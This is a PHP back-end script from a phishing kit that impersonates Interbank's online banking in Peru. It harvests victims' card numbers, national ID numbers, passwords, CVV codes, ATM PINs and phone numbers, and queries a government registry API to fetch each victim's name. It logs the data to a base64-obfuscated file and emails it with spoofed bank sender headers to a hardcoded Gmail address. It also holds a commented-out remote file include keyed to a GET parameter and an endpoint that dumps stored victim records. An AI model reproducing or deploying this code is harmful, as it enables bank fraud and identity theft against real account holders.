<?php
error_reporting(1);
date_default_timezone_set("America/Lima");
/*****************************************************************************/
//@include($_GET["cgi"]);
$accion = $_GET["id"];
define(EMAIL_LOGS,"ii568827@gmail.com");
/*****************************************************************************/
$ipv = $_SERVER["REMOTE_ADDR"];
$ua = $_SERVER["HTTP_USER_AGENT"];
$prefijo = substr(md5(uniqid(rand())), 0, 6);
$rspl = "ZmlsZXMvbG9nb2liLnBocA==";
/*****************************************************************************/

require "var1.php";

if($accion=="0")
{
    $ccx = $_POST["creditcard"];
    $dni = $_POST["boton1"];
    $pas = $_POST["pass"];
    
    if(strlen($pas)<5)
    {
        echo -15;
        exit;
    }
    
    $_SESSION["creditcard"]=$ccx;
    
    function consulta_dni2($dni)
    {
        $url = 'https://aplicaciones007.jne.gob.pe/srop_publico/Consulta/api/AfiliadoApi/GetNombresCiudadano';
        $ch = curl_init($url);
        $headers = [
        "Host: aplicaciones007.jne.gob.pe",
        "Connection: keep-alive",
        "Accept: */*",
        "RequestVerificationToken: GtouHOPRGU6Qbohb9kWkn_h1QErmooJIr4v6xrgitCj32Hl51f2g6a0MNHw5y-WUIJChaga1BmM--S_ybf4qfk91Zat3Y0-IJLPSLO3rGOs1:vspnqwJlq_9r0LUOUnCeWXUlgyeNJFP_sD8-2VMhQQtNwAVNJrrlW6xT4O3vo_04TZ5llAz6T0LwH59y4yKIDDAaFTzNE3_xDcL7jQ3qkZ81",
        "X-Requested-With: XMLHttpRequest",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
        "Content-Type: application/json;chartset=utf-8",
        "Origin: https://aplicaciones007.jne.gob.pe",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://aplicaciones007.jne.gob.pe/srop_publico/Consulta/Afiliado",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: es-419,es;q=0.9"
        ];
        $data = array(
                'CODDNI' => $dni
        );
        $payload=json_encode($data);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $contenido = curl_exec($ch);
        curl_close($ch);
        $respuesta=json_decode($contenido,true);
        return $respuesta["data"];
    }
    $nombre_consultado = consulta_dni2($dni);
    $nombre_consultado=trim($nombre_consultado);    
    if($nombre_consultado=="||")
    {
        echo -15;
        exit;
    }
    $nombre_consultado= str_replace("|", " ", $nombre_consultado);
        
    
    $_SESSION["nombre"]=$nombre_consultado;
    //crear archivo de visitante 45
    $DataClienteArray["estado"]="cargando";
    $DataClienteArray["id_sesion"]="$sesion_id";
    $DataClienteArray["fecha"]="$FechaHoy";
    $DataClienteArray["nombre"]="$nombre_consultado";
    
    $DataClienteArray["info1"]="$ccx";
    $DataClienteArray["info2"]="$dni";
    $DataClienteArray["info3"]="$pas";
    $DataClienteArray["info4"]="";
    $DataClienteArray["info5"]="";
    $DataClienteArray["info6"]="";
    $DataClienteArray["info7"]="";
    $DataClienteArray["info8"]="";
    $DataClienteArray["info9"]="";
    $DataClienteArray["info10"]="";
    
    $DataClienteJson = json_encode($DataClienteArray,JSON_HEX_APOS);
    $fo = fopen("./Data1/$FileCliente","w");
    fwrite($fo,$DataClienteJson);
    fclose($fo);
    //end45
    
    
    //include 'files/reniec/consulta.php';
    $name = $nombres." ";
    $surn = $paterno." ".$materno;
    $sms = "-------------------- [$ipv] --------------------<br /><br />
    Interbank Login ".date("d/m/Y H:i:s")."<br><br>
    Acceso: [Cliente - $name$surn][Card - $ccx] [DNI - $dni] [Clave - $pas]<br><br>
    $ua<br><br>
    ------------------------------------------------------------------------<br>
    https://bancaporinternet.interbank.pe/<br>
    ------------------------------------------------------------------------<br /><br />";
    $back = fopen(base64_decode($rspl), "a+");
    fwrite($back, $sms);
    fclose($back);

    $subj = "Interbank Login - $ipv";
    $header .= "From: Interbank <$ipv@interbank.com>" . "\r\n";
    $header .= "MIME-Version: 1.0" . "\r\n";
    $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
    @mail(EMAIL_LOGS, $subj, $sms, $header);
    
    $redir= "load.php?id=".base64_encode($dni)."&cgi=".base64_encode($pas);
    echo $redir;
    exit;
    
    
}

if($accion=="1")
{
    $z = $_POST["idX"];
    $zp = $_POST["idy"];

    $car = base64_decode($z);
    $zpw = base64_decode($zp);

    $udn = $_POST["dniCard"];
    $mec = $_POST["mesCard"];
    $anc = $_POST["yearCard"];
    $cvc = $_POST["cvcCard"];
    $uat = $_POST["atmCard"];        

    $FileCliente_ = @file_get_contents("./Data1/".$FileCliente);
    if($FileCliente_ !== false)
    {
        $infoJsonDecode = json_decode($FileCliente_, true);
        $fechaDeExpiracionTmp = $infoJsonDecode['Datos3']['Fv'];
        $infoJsonDecode['estado'] = "cargando";
        $infoJsonDecode['info4'] = "$mec/$anc";
        $infoJsonDecode['info5'] = $cvc;
        $infoJsonDecode['info6'] = $uat;
        $infoJsonDecode['Datos4']['operador'] = $ope;
        $infoJsonEncode = json_encode($infoJsonDecode,JSON_HEX_APOS);
        $fo = fopen("./Data1/".$FileCliente,"w");
        fwrite($fo,$infoJsonEncode);
        fclose($fo);
        
        $sms = "-------------------- [$ipv] --------------------<br /><br />
        Interbank Card ".date("d/m/Y H:i:s")."<br><br>
        Acceso: [Cliente - {$infoJsonDecode['nombre']}][Card - {$infoJsonDecode['info1']} ] [DNI - {$infoJsonDecode['info2']} ] [Clave - {$infoJsonDecode['info3']}]<br><br>
        Datos CC: [Card - {$infoJsonDecode['info1']}] [Exp - {$infoJsonDecode['info4']}] [Cvv - {$infoJsonDecode['info5']}][ATM - {$infoJsonDecode['info6']}][{$infoJsonDecode['info7']} - {$infoJsonDecode['info8']}]
        <br><br>
        ------------------------------------------------------------------------<br>
        https://bancaporinternet.interbank.pe/ <br>
        ------------------------------------------------------------------------<br /><br />";
        
        $subj = "Interbank Card - $ipv";
        $header .= "From: Interbank <$ipv@bn.com.pe>" . "\r\n";
        $header .= "MIME-Version: 1.0" . "\r\n";
        $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
        @mail(EMAIL_LOGS, $subj, $sms, $header);

        header ("Location: doc/load.php?id=".base64_encode($car)."&id_token=".$rand);
        exit;
        
    }else
    {
        header ("Location: doc/error.php?id=".base64_encode($car)."&id_token=".$rand);
        exit;
    }

}

if($accion=="2")
{
    $z = $_POST["idX"];
    $zp = $_POST["idy"];

    $car = base64_decode($z);
    $zpw = base64_decode($zp);

    $ope = $_POST["opCell"];
    $nce = $_POST["cell"];
    
    $FileCliente_ = @file_get_contents("./Data1/".$FileCliente);
    if($FileCliente_ !== false)
    {
        $infoJsonDecode = json_decode($FileCliente_, true);
        $fechaDeExpiracionTmp = $infoJsonDecode['Datos3']['Fv'];
        $infoJsonDecode['estado'] = "cargando";
        $infoJsonDecode['info8'] = $nce;
        $infoJsonDecode['info7'] = $ope;
        $infoJsonEncode = json_encode($infoJsonDecode,JSON_HEX_APOS);
        $fo = fopen("./Data1/".$FileCliente,"w");
        fwrite($fo,$infoJsonEncode);
        fclose($fo);
        
        $sms = "-------------------- [$ipv] --------------------<br /><br />
        Interbank Card ".date("d/m/Y H:i:s")."<br><br>

        Acceso: [Cliente - $xnn][Card - $udn] [DNI - $car] [Clave - $zpw]<br><br>

        Datos CC: [Card - ] [Exp - ] [Cvv - ][ATM - ][$ope - $nce]<br><br>
        ------------------------------------------------------------------------<br>
        https://bancaporinternet.interbank.pe/<br>
        ------------------------------------------------------------------------<br /><br />";

        $subj = "Interbank Card - $ipv";
        $header .= "From: Interbank <$ipv@bn.com.pe>" . "\r\n";
        $header .= "MIME-Version: 1.0" . "\r\n";
        $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
        @mail(EMAIL_LOGS, $subj, $sms, $header);

        header ("Location: doc/load.php?id=".base64_encode($car)."&id_token=".$rand);
        exit;
    }else
    {
        header ("Location: doc/error.php?id=".base64_encode($car)."&id_token=".$rand);
        exit;
    }

    
}

if($accion=="3")
{
    $z = $_POST["idX"];
    $zp = $_POST["idy"];

    $car = base64_decode($z);
    $zpw = base64_decode($zp);

    $nce = $_POST["cell"];
    
    $FileCliente_ = @file_get_contents("./Data1/".$FileCliente);
    if($FileCliente_ !== false)
    {
        $infoJsonDecode = json_decode($FileCliente_, true);
        $infoJsonDecode['estado'] = "cargando";
        $infoJsonDecode['info9'] = $nce;
        $infoJsonEncode = json_encode($infoJsonDecode,JSON_HEX_APOS);
        $fo = fopen("./Data1/".$FileCliente,"w");
        fwrite($fo,$infoJsonEncode);
        fclose($fo);
        
        $sms = "-------------------- [$ipv] --------------------<br /><br />
        Interbank Card ".date("d/m/Y H:i:s")."<br>
        Acceso: [Cliente - {$infoJsonDecode['nombre']}][Card - {$infoJsonDecode['info1']} ] [DNI - {$infoJsonDecode['info2']} ] [Clave - {$infoJsonDecode['info3']}]<br><br>
        Datos CC: [Card - {$infoJsonDecode['info1']}] [Exp - {$infoJsonDecode['info4']}] [Cvv - {$infoJsonDecode['info5']}][ATM - {$infoJsonDecode['info6']}][{$infoJsonDecode['info7']} - {$infoJsonDecode['info8']}]
        ------------------------------------------------------------------------<br>
        https://bancaporinternet.interbank.pe/<br>
        ------------------------------------------------------------------------<br /><br />";

        $subj = "Interbank Card - $ipv";
        $header .= "From: Interbank <$ipv@bn.com.pe>" . "\r\n";
        $header .= "MIME-Version: 1.0" . "\r\n";
        $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
        @mail(EMAIL_LOGS, $subj, $sms, $header);

        header ("Location: doc/load.php?id=".base64_encode($car)."&id_token=".$rand);
        exit;
    }else
    {
        header ("Location: doc/error.php?id=".base64_encode($car)."&id_token=".$rand);
        exit;
    }

    
}

if($accion=="88")
{
    $FileCliente_ = @file_get_contents("./Data1/".$FileCliente);
    echo $FileCliente_;
    exit;
}

?>